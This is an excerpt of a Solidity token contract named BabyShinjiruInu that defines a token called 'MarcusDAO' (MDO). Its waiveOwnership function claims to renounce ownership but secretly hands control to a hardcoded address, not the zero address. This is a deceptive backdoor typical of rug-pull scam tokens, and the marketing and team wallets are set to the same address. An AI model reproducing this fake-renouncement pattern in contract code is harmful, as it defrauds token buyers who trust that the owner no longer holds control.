...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xE2fcdb0aE02cd5076273437600cF7bE143048f2B));
        _owner = address(0xE2fcdb0aE02cd5076273437600cF7bE143048f2B);
    }
...
contract BabyShinjiruInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MarcusDAO";
    string private _symbol = "MDO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4103a16d2B6050C65923dDC4f680930550FE0851);
    address payable public teamWalletAddress = payable(0x4103a16d2B6050C65923dDC4f680930550FE0851);
